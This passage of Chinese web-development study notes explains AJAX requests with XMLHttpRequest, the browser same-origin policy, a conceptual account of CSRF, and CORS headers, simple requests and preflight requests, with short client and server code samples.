12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">创建员工</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [59].jpg" type="image/jpeg" data-filename="3.jpg" width="663"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">ajax的使用形式：ajax(url, fnSucc, fnFaild)，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">响应成功和响应失败的函数都要写</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">服务器文件的字符编码要和请求文件的字符编码一致，一般都是utf-8。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">在url里 &quot;服务器数据文件?t&quot; + new Date().getTime() 添加查询字符串阻止缓存。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">index.html</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">&lt;button id=&quot;myButton&quot;&gt;点我&lt;/button&gt;</font></div><div><font style="font-size: 12pt;">&lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;   &lt;!-- 当前目录下的main.js --&gt;</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">main.js</span></font></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;"><font>// </font>使用 XMLHttpRequest 发请求</font></div><div><font style="font-size: 12pt;">myButton.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    let request = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;">    request.open('get', '/xxx'); </font><font style="font-size: 12pt;"><font>// 配置request，</font>request.readystate为1</font></div><div><font style="font-size: 12pt;">    request.send();              </font><font style="font-size: 12pt;"><font>// </font>request.readystate为2</font></div><div><font style="font-size: 12pt;">    // 请求需要9ms</font></div><div><font style="font-size: 12pt;"><font>    // console.log('</font>打印这句话的时候，请求还没结束!');</font></div><div><font style="font-size: 12pt;">    request.onreadystatechange = () =&gt; {</font></div><div><font style="font-size: 12pt;">        if (request.readyState === 4) {</font></div><div><font style="font-size: 12pt;">            // console.log('请求响应都完毕了，但不代表请求成功')</font></div><div><font style="font-size: 12pt;">            if (request.status &gt;= 200 &amp;&amp; request.status &lt; 300) {</font></div><div><font style="font-size: 12pt;">               </font> <font style="font-size: 12pt;"><font> // 状态码大于200且小于</font>300<font>，如201 203都成功，即出现2开头的状态码才代表成功</font></font></div><div><font style="font-size: 12pt;">                 // console.log('说明请求成功')</font></div><div><font style="font-size: 12pt;">                 </font><font style="font-size: 12pt;"><font>// 接收</font>JSON 语法的字符串</font></div><div><font style="font-size: 12pt;">                 let string = request.responseText;</font></div><div><font style="font-size: 12pt;">                 </font><font style="font-size: 12pt;"><font>//</font> 把符合JSON 语法的字符串<font>转换成 JS 对应的值（有可能是对象，也有可能是数组或null等），这里是JS的object对象</font></font></div><div><font style="font-size: 12pt;">                 let object = window.JSON.parse(string);</font></div><div><font style="font-size: 12pt;">                 // JSON.parse 是浏览器提供的</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">        else if (request.status &gt;= 400) {</font></div><div><font style="font-size: 12pt;">            // 出现4开头的状态码</font></div><div><font style="font-size: 12pt;">            console.log('说明请求失败');</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">  }</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">同源策略</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">只有 协议 + 域名 </span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">+ 端口 </span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">一模一样 才允许发 AJAX 请求</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;">一模一样一模一样一模一样</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">换句话说就是，AJAX 只能下载同源的数据，跨源的数据禁止下载！</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">只有AJAX发的请求会</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">受同源策略影响，因为</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">AJAX 可以读取响应内容，会造成隐私信息泄露（登录的用户名和密码、支付密码、图片等）！</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">其他标签（&lt;iframe&gt;、&lt;a&gt;、&lt;link&gt;、&lt;img&gt;、&lt;script&gt;）发的请求，不受同源策略影响！</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">浏览器这个策略的本质是：一个域名的 JS ，在未经允许的情况下，不得读取另一个域名的内容，但浏览器并不阻止你向另一个域名发送请求。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">AJAX服务端响应过后，是脚本接管了整个后续过程，</span><span style="font-size: 12pt;">控制权其实交给了脚本，而不是与用户直接发生交互的浏览器</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">那么脚本对于用户来说是不可知不可信的，鬼知道这段脚本是业务逻辑还是攻击代码。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">防止跨域访问，是浏览器的基本功能，</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">如果一个浏览器没有这个功能，那就是一个不安全的浏览器，是有 bug 的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">跨域</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [60].jpg" type="image/jpeg" data-filename="3.jpg" width="678"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [61].jpg" type="image/jpeg" data-filename="3.jpg" width="668"/></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">例如：http://frank.com:8001向 http://jack.com:8002 发送 AJAX 请求时报错：</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">No &quot;Access-Control-Allow-Origin' header is present on the requested resource</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">突破同源策略 === 跨域（跨站发送AJAX请求）</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [62].jpg" type="image/jpeg" data-filename="3.jpg" width="691"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">CORS（</span><span style="font-size: 12pt; font-weight: bold;">跨域资源共享</span><span style="font-size: 12pt; font-weight: bold;">）</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> </span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">CORS 可以告诉浏览器，我俩一家的，别阻止他</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">1、可以使用JSONP（但是不能发POST请求，老派风格），</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">2、也可以在后端加响应头，h</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">eader('Access-Control-Allow-Origin', 'http://frank.com:8001');</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">目前所有浏览器都支持该功能(IE8+：IE8/9需要使用XDomainRequest对象来支持CORS）)，CORS也已经成为主流的跨域解决方案。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">浏览器会自动进行 CORS 通信，实现 CORS 通信的关键在于后端。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">只要后端实现了 CORS，就实现了跨域。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">为什么form表单提交没有跨域问题，但ajax提交有跨域问题？</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">因为原页面用 form 提交到另一个域名之后，会刷新页面，原页面的脚本无法获取新页面中的内容，所以</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">浏览器认为这是安全的</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">前端frank.com代码</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">index.html</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">&lt;button id=&quot;myButton&quot;&gt;点我&lt;/button&gt;</span></div><div><span style="font-size: 12pt;">&lt;script src=&quot;./main.js&quot;&gt;&lt;/script&gt;   &lt;!-- 当前目录下的main.js --&gt;</span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">main.js</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">myButton.addEventListener('click', (e) =&gt; {</font></div><div><font style="font-size: 12pt;">    let request = new XMLHttpRequest();              // new XMLHttpRequest对象</font></div><div><font style="font-size: 12pt;">    request.open('get', 'http://jack.com:8002/xxx'); // 配置请求头     </font></div><div><font style="font-size: 12pt;">    request.send();                                  // 配置请求体</font></div><div><font style="font-size: 12pt;">    request.onreadystatechange = () =&gt; {             // 监听状态变化</font></div><div><font style="font-size: 12pt;">        if (request.readyState === 4) {</font></div><div><font style="font-size: 12pt;">            if (request.status &gt;= 200 &amp;&amp; request.status &lt; 300){</font></div><div><font style="font-size: 12pt;">                let string = request.responseText;</font></div><div><font style="font-size: 12pt;">                let object = window.JSON.parse(string)  // JSON字符串转换为JSON对象</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    };</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">这样就可以对后端返回来的数据</span><span style="font-size: 12pt; font-weight: bold;">request.responseText操作了：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [63].jpg" type="image/jpeg" data-filename="3.jpg" width="1210"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">后端jack.com代码</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">else if (path === '/xxx') {</font></div><div><font style="font-size: 12pt;">    response.statusCode = 200;                                                  // 配置状态码</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/json;charset=utf-8');</font></div><div><font style="font-size: 12pt;">  <b>  response.setHeader('Access-Control-Allow-Origin', 'http://frank.com:8001'); // 配置响应头 允许跨域资源共享CORS</b></font></div><div><font style="font-size: 12pt;"> </font> <font style="font-size: 12pt;"><font>  // </font>服务器返回 JSON 格式的字符串，HTTP响应第四部分永远返回的是字符串              // 配置响应体                   </font></div><div><font style="font-size: 12pt;">    response.write(`                                                         </font></div><div><font style="font-size: 12pt;">        {</font></div><div><font style="font-size: 12pt;">            &quot;note&quot;: {</font></div><div><font style="font-size: 12pt;">                &quot;to&quot;: &quot;小谷&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;from&quot;: &quot;方方&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;heading&quot;: &quot;打招呼&quot;,</font></div><div><font style="font-size: 12pt;">                &quot;content&quot;: &quot;hi&quot;</font></div><div><font style="font-size: 12pt;">            }</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    `);</font></div><div><font style="font-size: 12pt;">    response.end();</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;">else {</font></div><div><font style="font-size: 12pt;">    response.statusCode = 404;</font></div><div><font style="font-size: 12pt;">    response.setHeader('Content-Type', 'text/html;charset=utf8');</font></div><div><font style="font-size: 12pt;">    response.write(`{</font></div><div><font style="font-size: 12pt;">        &quot;error&quot;: &quot;not found&quot;</font></div><div><font style="font-size: 12pt;">    }`)</font></div><div><font style="font-size: 12pt;">    response.end();</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [64].jpg" type="image/jpeg" data-filename="3.jpg" width="669"/></div><div style="text-align: justify;"><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">同源策略</span></div><div><br/></div><div><span style="font-size: 12pt;">源 = </span><span style="font-size: 12pt;">协议 + 域名 + 端口</span></div><div><br/></div><div><span style="font-size: 12pt;">同源策略声明一个域上的网站，无法向另一个域发出 XMLHttpRequest(XHR) 请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">这可以防止恶意网站向已知网站（比如 Facebook 或者 Google）发出请求，改变用户的登录状态，以便可以冒充其他用户。</span></div><div><br/></div><div><span style="font-size: 12pt;">此策略由浏览器实现（所有浏览器都实现了同源策略，尽管实现细节上存在细微的差别），</span></div><div><br/></div><div><span style="font-size: 12pt;">这意味着此策略并不适用于从服务器，或者任何其他 HTTP 客户端（比如 curl ，postman）发出的请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">同源策略绝不意味着防止攻击者向您的服务器发出请求（因为攻击者显然不会使用浏览器）。</span></div><div><br/></div><div><span style="font-size: 12pt;">它只是为了防止合法用户在使用浏览器浏览网站时，在不知情的情况下，向你的网站发起请求。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">关于 </span><span style="font-size: 12pt; font-weight: bold;">CSRF(跨站请求伪造)</span> <span style="font-size: 12pt; font-weight: bold;">的说明</span></div><div><br/></div><div><span style="font-size: 12pt;">有一类攻击称为 CSRF(跨站请求伪造)，它无法通过同源策略来避免。</span></div><div><br/></div><div><span style="font-size: 12pt;">在CSRF攻击中，攻击者向后台的第三方页面发出请求，例如向我们的银行网站发送 POST 请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">如果我们与银行存在一个有效的会话，任何网站都可以在后台发出请求，该请求将被执行，除非咱们的银行网站有针对CSRF的措施。</span></div><div><br/></div><div><span style="font-size: 12pt;">注意，尽管同源策略已经生效，但是我们的示例请求从</span> <a href="http://thirdparty.com/" style="font-size: 12pt;">thirdparty.com</a> <span style="font-size: 12pt;">成功请求到</span> <a href="http://good.com/" style="font-size: 12pt;">good.com</a><span style="font-size: 12pt;">，只是我们无法得到结果。</span></div><div><br/></div><div><span style="font-size: 12pt;">但对于 CSRF 来说，不需要得到结果。</span></div><div><br/></div><div><span style="font-size: 12pt;">比如，有个 API 通过 POST 请求方式发送邮件，返回的内容是我们需要关心的，但攻击者不在乎结果，他们关心的是电子邮件是否发送成功。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">CORS（cross-origin resource sharing）</span><span style="font-size: 12pt; font-weight: bold;">跨源资源共享（一般俗称『跨域请求』）</span></div><div><br/></div><div><span style="font-size: 12pt;">CORS 并不是一种安全措施，实际上恰恰相反：CORS 是一种绕过“同源策略(SOP)”的方法。</span></div><div><br/></div><div><span style="font-size: 12pt;">当一个资源从与该资源本身所在的服务器不同的域或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">比如，站点</span> <a href="http://domain-a.com/" style="font-size: 12pt;">http://domain-a.com</a> <span style="font-size: 12pt;">的某 HTML 页面通过的 src 请求</span> <a href="http://domain-b.com/image.jpg" style="font-size: 12pt;">http://domain-b.com/image.jpg</a><span style="font-size: 12pt;">。</span></div><div><br/></div><div><span style="font-size: 12pt;">网络上的许多页面都会加载来自不同域的CSS样式表，图像和脚本等资源。</span></div><div><br/></div><div><span style="font-size: 12pt;">出于安全原因，浏览器限制从脚本内发起的跨域 HTTP 请求。 例如，XMLHttpRequest 和 Fetch API 遵循同源策略。 </span></div><div><br/></div><div><span style="font-size: 12pt;">这意味着使用这些 API 的 Web 应用程序只能从加载应用程序的同一个域请求 HTTP 资源，除非使用 CORS 头文件。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">译者注：</span></div><div><br/></div><div><span style="font-size: 12pt;">跨域并不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。</span></div><div><br/></div><div><span style="font-size: 12pt;">最好的例子是 CSRF 跨站攻击原理，请求是发送到了后端服务器，无论是否跨域！</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">注意：</span></div><div><br/></div><div><span style="font-size: 12pt;">有些浏览器不允许从 HTTPS 的域跨域访问 HTTP，比如 Chrome 和 Firefox，这些浏览器在请求还未发出的时候就会拦截请求，这是一个特例。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [2].png" type="image/png" data-filename="3.png" width="925"/></div><div><br/></div><div><span style="font-size: 12pt;">隶属于 W3C 的 Web 应用工作组推荐了一种新的机制，即跨源资源共享（Cross-Origin Resource Sharing ) CORS。</span></div><div><br/></div><div><span style="font-size: 12pt;">这种机制让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</span></div><div><br/></div><div><span style="font-size: 12pt;">需要特别注意的是，这个规范是针对API容器的（比如说XMLHttpReques 或者 Fetch），以减轻跨域HTTP请求的风险。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">跨域资源共享标准（ cross-origin sharing standard ）允许在下列场景中使用跨域 HTTP 请求：</span></div><div><br/></div><div><span style="font-size: 12pt;">● 前文提到的由 XMLHttpRequest 或 Fetch 发起的跨域 HTTP 请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">Web 字体 (CSS 中通过 @font-face 使用跨域字体资源), 因此，网站就可以发布 TrueType 字体资源，并只允许已授权网站进行跨站调用。</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> WebGL 贴图</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 使用 drawImage 将 Images/video 画面绘制到 canvas</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 样式表（使用 CSSOM）</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> Scripts (未处理的异常)</span></div><div><br/></div><div><span style="font-size: 12pt;">CORS 需要客户端和服务器同时支持。</span><span style="font-size: 12pt; color: unset; font-family: unset;">目前，所有浏览器都支持该机制。 </span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">三种请求</span></div><div><br/></div><div><span style="font-size: 12pt;">CORS 分为：简单请求、预检请求和附带凭证信息的请求。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">简单请求</span></div><div><br/></div><div><span style="font-size: 12pt;">某些请求不会触发 CORS 预检请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。</span></div><div><br/></div><div><span style="font-size: 12pt;">若请求满足所有下述条件，则该请求可视为“简单请求”：</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">● 简单请求的 HTTP 方法只能是 GET、HEAD 或 POST</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">● </span><span style="font-size: 12pt;">简单请求的 HTTP 头只能是 Accept/Accept-Language/Conent-Language/Content-Type 等</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt;"> 简单请求的 Content-Type 头只能是 text/plain、multipart/form-data 或 application/x-www-form-urlencoded</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">其实，简单请求就是普通 HTML Form 在不依赖脚本的情况下可以发出的请求，即</span><span style="font-size: 12pt; font-weight: bold;">简单请求就是表单请求</span></div><div><br/></div><div><span style="font-size: 12pt;">简单来说，重点需要记住的就是两点：</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">（1）只使用 GET, HEAD 或者 POST 请求方法。</span></div><div><br/></div><div><span style="font-size: 12pt;">如果使用 POST 向服务器端传送数据，则数据类型(Content-Type)只能是 application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">（2）不使用自定义请求头（类似于 X-Modified 这种）。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [65].jpg" type="image/jpeg" data-filename="3.jpg" width="1080"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">//比如说，假如站点 <a href="http://foo.example/">http://foo.example</a> 的网页应用想要访问 <a href="http://bar.other/">http://bar.other</a> 的资源。以下的 JavaScript 代 //码应该会在 foo.example 上执行：    </span></div><div><span style="font-size: 12pt;">var invocation = new XMLHttpRequest();</span></div><div><span style="font-size: 12pt;">var url = '<a href="http://bar.other/resources/public-data/';">http://bar.other/resources/public-data/';</a></span></div><div><span style="font-size: 12pt;">function callOtherDomain() {</span></div><div><span style="font-size: 12pt;">  if(invocation) {    </span></div><div><span style="font-size: 12pt;">    invocation.open('GET', url, true);</span></div><div><span style="font-size: 12pt;">    invocation.onreadystatechange = handler;</span></div><div><span style="font-size: 12pt;">    invocation.send();</span></div><div><span style="font-size: 12pt;">  }</span></div><div><span style="font-size: 12pt;">}</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [3].png" type="image/png" data-filename="3.png" width="514"/></div><div><br/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">//让我们看看，在这个场景中，浏览器会发送什么的请求到服务器，而服务器又会返回什么给浏览器：</span></div><div><span style="font-size: 12pt;">GET /resources/public-data/ HTTP/1.1</span></div><div><span style="font-size: 12pt;">Host: bar.other</span></div><div><span style="font-size: 12pt;">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130</span></div><div><span style="font-size: 12pt;">Minefield/3.1b3pre</span></div><div><span style="font-size: 12pt;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></div><div><span style="font-size: 12pt;">Accept-Language: en-us,en;q=0.5</span></div><div><span style="font-size: 12pt;">Accept-Encoding: gzip,deflate</span></div><div><span style="font-size: 12pt;">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</span></div><div><span style="font-size: 12pt;">Connection: keep-alive</span></div><div><span style="font-size: 12pt;">Referer: <a href="http://foo.example/examples/access-control/simpleXSInvocation.htmlOrigin">http://foo.example/examples/access-control/simpleXSInvocation.htmlOrigin</a>: <a href="http://foo.example/">http://foo.example</a> //该请求来自于 <a href="http://foo.exmaple/">http://foo.exmaple</a>。</span></div><div><span style="font-size: 12pt;">//以上是浏览器发送请求</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;">HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 00:23:53 GMT</span></div><div><span style="font-size: 12pt;">Server: Apache/2.0.61</span></div><div><span style="font-size: 12pt;">Access-Control-Allow-Origin: * //这表明服务器接受来自任何站点的跨站请求。如果设置为<a href="http://foo.example/">http://foo.example</a>。其它站点就不能跨站访问 <a href="http://bar.other/">http://bar.other</a> 的资源了。</span></div><div><span style="font-size: 12pt;">Keep-Alive: timeout=2, max=100</span></div><div><span style="font-size: 12pt;">Connection: Keep-Alive</span></div><div><span style="font-size: 12pt;">Transfer-Encoding: chunked</span></div><div><span style="font-size: 12pt;">Content-Type: application/xml</span></div><div><span style="font-size: 12pt;">//以上是服务器返回信息给浏览器</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">●</span><span style="font-size: 12pt; color: unset; font-family: unset;"> </span><span style="font-size: 12pt; color: unset; font-family: unset;">如果资源是允许公开访问的(就像任何允许GET访问的 HTTP资源)，返回 Access-Control-Allow-Origin:* 头信息就足够了</span></div><div><br/></div><div><span style="font-size: 12pt;">    除非是一些需要 Cookies 和 HTTP 身份验证信息的请求。</span></div><div><br/></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;">  </span><span style="font-size: 12pt;">如果资源访问被限制基于相同的域名,或者如果要访问的资源需要凭证(或设置凭证),那么就有必要对请求头信息中的 ORIGIN 进行过滤</span></div><div><br/></div><div><span style="font-size: 12pt;">    或者至少响应请求的来源(例如 Access-Control-Allow-Origin:</span><a href="http://arunranga.com/" style="font-size: 12pt;">http://arunranga.com</a> <span style="font-size: 12pt;">)。</span></div><div><br/></div><div><span style="font-size: 12pt;">    另外，将发送 Access-Control-Allow-Credentials:TRUE 头信息</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">预检请求（</span><span style="font-size: 12pt; font-weight: bold;">非简单请求 </span><span style="font-size: 12pt; font-weight: bold;">preflighted requests</span><span style="font-size: 12pt; font-weight: bold;">）</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">非简单请求就是普通 HTML Form 无法实现的请求。比如 PUT 方法、需要其他的内容编码方式、自定义头之类的。</span></span></div><div><br/></div><div><span style="font-size: 12pt;">非简单请求会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。</span></div><div><br/></div><div><span style="font-size: 12pt;">“预检”请求</span><span style="font-size: 12pt;">，对应的 HTTP 动词是 OPTIONS。</span></div><div><br/></div><div><span style="font-size: 12pt;">与简单请求不同，“<span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">需预检的请求”要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">OPTIONS 请求由浏览器发起，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">以</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">获知</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">服务器</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">某个资源</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">是否允许该请求跨域。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: 